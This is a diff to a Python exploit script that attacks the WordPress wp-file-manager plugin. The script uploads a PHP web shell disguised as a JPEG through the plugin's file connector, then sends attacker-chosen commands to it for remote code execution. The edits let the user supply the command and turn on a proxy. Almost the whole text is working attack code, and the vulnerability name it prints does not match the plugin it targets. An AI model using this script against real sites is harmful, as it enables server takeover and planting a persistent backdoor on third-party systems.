@@ -10,9 +10,9 @@ vuln_url = url + url_dir
 print "\n\nExample: python wordpress_filemanager.py url cmd\n"
 print ">>>Vuln Url=%s" % vuln_url
 cmd = sys.argv[2]
-cmd = "whoami"
+#cmd = "whoami"
 files = {
-  "upload[]" : ("sss.php", "<?php system($_POST['cmd']);?>", "image/jpeg")
+  "upload[]" : ("isvuln.php", "<?php system($_POST['cmd']);?>", "image/jpeg")
 }
 
 payload = {"cmd":"upload","target":"l1_Lw=="}
@@ -24,14 +24,14 @@ headers = {
     'Cache-Control': "no-cache"
     }
 
-response = requests.post(vuln_url, data=payload, files = files, headers=headers)#, proxies=proxies)
+response = requests.post(vuln_url, data=payload, files = files, headers=headers, proxies=proxies)
 #print(response.text)
-if  "sss" in response.text :
-    shell_url = url + "/wp-content/plugins/wp-file-manager/lib/files/sss.php"
-    data = {"cmd":"whoami"}
+if  "isvuln" in response.text :
+    shell_url = url + "/wp-content/plugins/wp-file-manager/lib/files/isvuln.php"
+    data = {"cmd":cmd}
     re = requests.post(shell_url, data=data)
     print "\n>>>>Exit CVE-2019-6340 RCE Vuln!\n"
-    print re.text
+    print re.content
       
 else:
     print "No Vuln Exit!"
